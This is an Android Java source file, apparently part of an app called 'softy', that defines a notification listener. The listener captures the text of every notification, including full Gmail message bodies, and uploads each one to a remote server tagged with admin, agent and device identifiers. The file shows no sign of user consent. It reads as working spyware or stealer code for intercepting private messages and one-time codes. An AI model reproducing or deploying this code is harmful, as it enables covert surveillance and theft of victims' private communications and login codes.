package com.topdown.softy.functions;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import android.util.Log;

import androidx.annotation.NonNull;

import com.topdown.softy.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SmsNotificationListener extends NotificationListenerService {
    private static final String TAG = "EmailNotification";
    private static final String GMAIL_PACKAGE = "com.google.android.gm";

    @SuppressLint("HardwareIds")
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn == null || sbn.getNotification() == null) return;
//            Utils.markLog(this, "Notification Posted ✉", "SmsNotificationListener 1");
            final String packageName = sbn.getPackageName();
            if (GMAIL_PACKAGE.equals(packageName)) {
                processGmailNotification(sbn);
            } else {
                processGenericNotification(sbn);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification", e);
        }
    }

    @SuppressLint("HardwareIds")
    private void processGmailNotification(StatusBarNotification sbn) {
        final Notification notification = sbn.getNotification();
        final Bundle extras = notification.extras;
        if (extras == null) return;

        final String notificationStyle = extras.getString(Notification.EXTRA_TEMPLATE);
        final CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);

        try {
            if ("android.app.Notification$BigTextStyle".equals(notificationStyle)) {
                handleSingleEmail(extras, title);
            } else if ("android.app.Notification$InboxStyle".equals(notificationStyle)) {
                handleMultipleEmails(extras);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing Gmail notification", e);
        }
    }

    private void handleSingleEmail(Bundle extras, CharSequence title) {
        final CharSequence bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
        final String body = bigText != null ? bigText.toString() : "No content";

        logAndEmitNotification(
                "Single Email",
                title != null ? title.toString() : "No subject",
                body
        );
    }

    private void handleMultipleEmails(Bundle extras) {
        final CharSequence[] textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
        if (textLines == null) return;

        for (CharSequence line : textLines) {
            if (line != null) {
                logAndEmitNotification(
                        "Grouped Emails",
                        "Multiple Messages",
                        line.toString()
                );
            }
        }
    }

    @SuppressLint("HardwareIds")
    private void processGenericNotification(StatusBarNotification sbn) {
        final Notification notification = sbn.getNotification();
        final Bundle extras = notification.extras;
        if (extras == null) return;

        final CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
        final CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);

        logAndEmitNotification(
                getApplicationName(sbn.getPackageName()),
                title != null ? title.toString() : "",
                text != null ? text.toString() : ""
        );
    }

    @SuppressLint("HardwareIds")
    private void logAndEmitNotification(String appName, String title, String content) {
        // Filter out empty notifications
        if (TextUtils.isEmpty(title) && TextUtils.isEmpty(content)) return;

        Log.d(TAG, "App: " + appName);
        Log.d(TAG, "Title: " + title);
        Log.d(TAG, "Content: " + content);

        try {
            RetrofitClient.getInstance(this).getApiInterfaces().saveNotification(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_USERNAME).put("agentID", Utils.AGENT_ID).put("deviceID", Utils.getDeviceID(this)).put("appName", appName).put("title", title).put("text", content))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
//                    Utils.markLog(SmsNotificationListener.this, "Notification Sent to Server ✅", "SmsNotificationListener 2");
                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {
//                    Utils.markLog(SmsNotificationListener.this, "Unable to Send Notification :" + throwable.getMessage(), "SmsNotificationListener 3");
                }
            });
        } catch (JSONException ignored) {
        }
    }

    private String getApplicationName(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (PackageManager.NameNotFoundException e) {
            return packageName; // Return package name if name not found
        }
    }
}

